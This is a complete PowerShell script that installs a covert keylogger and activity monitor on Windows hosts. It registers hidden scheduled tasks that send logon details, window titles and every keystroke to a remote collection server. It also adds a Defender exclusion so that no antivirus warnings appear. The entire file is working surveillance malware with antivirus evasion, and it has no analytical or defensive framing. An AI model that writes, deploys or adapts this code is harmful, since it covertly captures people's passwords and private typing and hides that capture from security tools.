$CollectionServer  = "http://YOUR_SERVER_IP:8080/"
$FlushInterval     = 3000   # milliseconds — how often keystrokes are sent (1000 = 1s, 3000 = 3s)

$LogonScript = @'
$sessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId

# RDP source IP — empty on console sessions
$rdpClientIp = $null
try {
    $rdpClientIp = (Get-WmiObject -Namespace root\cimv2\TerminalServices `
                        -Class Win32_TSSessionSetting `
                        -Filter "SessionID=$sessionId").ClientIPAddress
} catch {}

# AD groups — gracefully skipped if not domain-joined
$adGroups = $null
try {
    $adProps  = ([adsisearcher]"(samaccountname=$env:USERNAME)").FindOne().Properties
    $adGroups = ($adProps.memberof | ForEach-Object {
                    ($_ -split ',')[0] -replace 'CN=', ''
                }) -join "; "
} catch {}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$body = @{
    event_type      = "logon"
    username        = $env:USERNAME
    hostname        = $env:COMPUTERNAME
    domain          = $env:USERDOMAIN
    logon_server    = $env:LOGONSERVER
    timestamp       = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    session_type    = if ($env:SESSIONNAME -like "RDP*") { "RDP" } else { "Console" }
    session_id      = $sessionId
    rdp_client_name = $env:CLIENTNAME
    rdp_client_ip   = $rdpClientIp
    is_admin        = $isAdmin
    ad_groups       = $adGroups
} | ConvertTo-Json

try {
    Invoke-WebRequest -Uri "http://YOUR_SERVER_IP:8080/" `
                      -Method POST `
                      -ContentType "application/json" `
                      -Body $body `
                      -UseBasicParsing | Out-Null
} catch {}
'@

$WindowMonitor = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
}
"@

$server    = "http://YOUR_SERVER_IP:8080/"
$lastTitle = ""

while ($true) {
    Start-Sleep -Seconds 5

    $hwnd = [WinAPI]::GetForegroundWindow()
    $sb   = New-Object System.Text.StringBuilder 512
    [WinAPI]::GetWindowText($hwnd, $sb, 512) | Out-Null
    $title = $sb.ToString().Trim()

    if ($title -and $title -ne $lastTitle) {
        $procId  = [uint32]0
        [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$procId) | Out-Null
        $process = (Get-Process -Id $procId -ErrorAction SilentlyContinue).ProcessName

        $body = @{
            event_type   = "window_change"
            username     = $env:USERNAME
            hostname     = $env:COMPUTERNAME
            timestamp    = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            window_title = $title
            process      = $process
        } | ConvertTo-Json

        try {
            Invoke-WebRequest -Uri $server -Method POST -ContentType "application/json" `
                              -Body $body -UseBasicParsing | Out-Null
        } catch {}

        $lastTitle = $title
    }
}
'@

$KeyboardMonitor = @'
Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;

public class KeyboardMonitor {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN     = 0x0100;
    private const int WM_SYSKEYDOWN  = 0x0104;

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr hmod, uint threadId);
    [DllImport("user32.dll")] private static extern bool   UnhookWindowsHookEx(IntPtr hk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hk, int code, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] ks);
    [DllImport("user32.dll")] private static extern int    ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder sb, int size, uint flags);
    [DllImport("user32.dll")] private static extern int    GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool   TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG msg);

    private delegate IntPtr LowLevelKeyboardProc(int code, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public IntPtr dwExtraInfo; }

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hWnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX, ptY; }

    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc;
    private static readonly StringBuilder buffer  = new StringBuilder();
    private static readonly object        bufLock = new object();
    private static string serverUrl, username, hostname;
    private static Timer  flushTimer;   // static field so the GC can't collect it while Start() parks in the message loop
    private static System.Threading.Mutex instanceLock;   // held for process lifetime; blocks a second monitor in the same session
    private static int    pid;          // this process id — lets the server tell duplicate senders apart
    private static int    seq;          // monotonic flush counter — advancing seq with identical keys == a stuck buffer
    private static readonly object logLock = new object();

    public static void Start(string url, string user, string host) {
        // Single-instance guard, scoped to the current session ("Local\" namespace).
        // If a previous monitor is still running in this session (e.g. -Force re-registered
        // the task without killing the old process), this instance exits instead of
        // installing a second hook and double-sending keystrokes.
        pid = System.Diagnostics.Process.GetCurrentProcess().Id;

        bool createdNew;
        instanceLock = new System.Threading.Mutex(true, "Local\\RDSKeystrokeMonitor", out createdNew);
        if (!createdNew) {
            Log("pid=" + pid + " another monitor already owns the session lock — exiting");
            return;
        }
        Log("pid=" + pid + " starting, server=" + url);

        serverUrl = url;
        username  = user;
        hostname  = host;

        flushTimer = new Timer(FLUSH_INTERVAL_MS) { AutoReset = true };
        flushTimer.Elapsed += (s, e) => Flush();
        flushTimer.Start();

        proc   = HookCallback;
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
        Log("pid=" + pid + " hook " + (hookId != IntPtr.Zero ? "installed" : "FAILED to install"));

        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }

        // Message pump exited — flush anything remaining before process ends
        Flush();
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
        if (code >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN)) {
            var ks = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            bool overCap = false;
            lock (bufLock) {
                buffer.Append(TranslateKey((int)ks.vkCode, ks.scanCode));
                if (buffer.Length > 5000) overCap = true;
            }
            if (overCap) System.Threading.ThreadPool.QueueUserWorkItem(_ => Flush());
        }
        return CallNextHookEx(hookId, code, wParam, lParam);
    }

    private static string TranslateKey(int vk, uint sc) {
        switch (vk) {
            case 8:  return "[BACK]";
            case 9:  return "[TAB]";
            case 13: return "[ENTER]";
            case 27: return "[ESC]";
            case 32: return " ";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            case 46: return "[DEL]";
        }
        byte[] keyState = new byte[256];
        GetKeyboardState(keyState);
        var sb     = new StringBuilder(4);
        int result = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
        if (result >= 1) return sb.ToString(0, result);
        if (result == -1) {
            ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
            return "";
        }
        return "";
    }

    private static string ActiveWindow() {
        var sb = new StringBuilder(512);
        GetWindowText(GetForegroundWindow(), sb, 512);
        return sb.ToString().Trim();
    }

    // Proper JSON string escaping. ToUnicode emits raw control characters for
    // Ctrl-key combos (Ctrl+C -> 0x03, etc.); those must be \u-escaped or the
    // payload is invalid JSON and the server drops it.
    private static string Escape(string s) {
        var sb = new StringBuilder(s.Length + 8);
        foreach (char c in s) {
            switch (c) {
                case '\\': sb.Append("\\\\"); break;
                case '"':  sb.Append("\\\""); break;
                case '\n': sb.Append("\\n");  break;
                case '\r': sb.Append("\\r");  break;
                case '\t': sb.Append("\\t");  break;
                case '\b': sb.Append("\\b");  break;
                case '\f': sb.Append("\\f");  break;
                default:
                    if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
                    else          sb.Append(c);
                    break;
            }
        }
        return sb.ToString();
    }

    // Local diagnostic log — the scheduled task runs hidden and swallows errors,
    // so upload failures land here instead of vanishing.
    private static void Log(string msg) {
        try {
            lock (logLock) {
                System.IO.File.AppendAllText("C:\\temp\\keyboard_monitor.log",
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "  " + msg + "\r\n");
            }
        } catch {}
    }

    private static void Flush() {
        string chunk;
        lock (bufLock) {
            if (buffer.Length == 0) return;
            chunk = buffer.ToString();
            buffer.Clear();
        }
        int mySeq = System.Threading.Interlocked.Increment(ref seq);
        string json = string.Format(
            "{{\"event_type\":\"keystrokes\",\"username\":\"{0}\",\"hostname\":\"{1}\"," +
            "\"timestamp\":\"{2}\",\"window\":\"{3}\",\"pid\":{4},\"seq\":{5},\"keystrokes\":\"{6}\"}}",
            Escape(username), Escape(hostname),
            DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
            Escape(ActiveWindow()), pid, mySeq, Escape(chunk));
        try {
            using (var client = new WebClient()) {
                client.Encoding = System.Text.Encoding.UTF8;   // default is ANSI — must match the server's UTF-8 decode
                client.Headers[HttpRequestHeader.ContentType] = "application/json; charset=utf-8";
                client.UploadString(serverUrl, json);
            }
            Log("sent seq=" + mySeq + " len=" + chunk.Length);
        } catch (Exception ex) {
            Log("send FAILED seq=" + mySeq + " len=" + chunk.Length + ": " + ex.Message);
        }
    }
}
"@

[KeyboardMonitor]::Start("http://YOUR_SERVER_IP:8080/", $env:USERNAME, $env:COMPUTERNAME)
'@

New-Item -ItemType Directory -Path "C:\temp" -Force | Out-Null

# Exclude C:\temp from Defender before writing scripts — silent, no tray warnings
Add-MpPreference -ExclusionPath "C:\temp"

$LogonScript.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\script.ps1" -Encoding UTF8

$WindowMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\window_monitor.ps1" -Encoding UTF8

$KeyboardMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer).Replace("FLUSH_INTERVAL_MS", $FlushInterval) | Set-Content -Path "C:\temp\keyboard_monitor.ps1" -Encoding UTF8

# Task 1: logon notification — runs as the logged-on user so env vars reflect the actual user
Register-ScheduledTask `
    -TaskName  "LogonNotify" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\script.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force

# Task 2: window monitor — per-session, runs as the logged-on user
Register-ScheduledTask `
    -TaskName  "WindowMonitor" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\window_monitor.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force

# Task 3: keyboard monitor — per-session, runs as the logged-on user
Register-ScheduledTask `
    -TaskName  "KeyboardMonitor" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\keyboard_monitor.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force
